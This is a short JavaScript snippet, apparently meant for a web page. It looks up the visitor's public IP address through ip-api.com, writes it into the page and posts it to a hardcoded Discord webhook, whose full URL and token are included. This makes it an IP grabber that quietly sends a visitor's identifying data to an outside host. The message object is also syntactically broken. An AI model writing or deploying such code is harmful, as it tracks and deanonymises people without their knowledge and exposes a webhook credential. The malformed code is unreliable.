const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";

fetch("http://ip-api.com/json/")
    .then(response => response.json())
    .then(json => {
        const query = json.query;
        document.getElementById("query").innerHTML = query;

        const msg = {
            ""content": `query - ${query}\n query - ${query}\n query - ${query}``
        };

        return fetch(whurl + "?wait=true", {
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "body": JSON.stringify(msg)
        });
    })
    .then(response => response.json())
    .then(console.log)
    .catch(console.error);
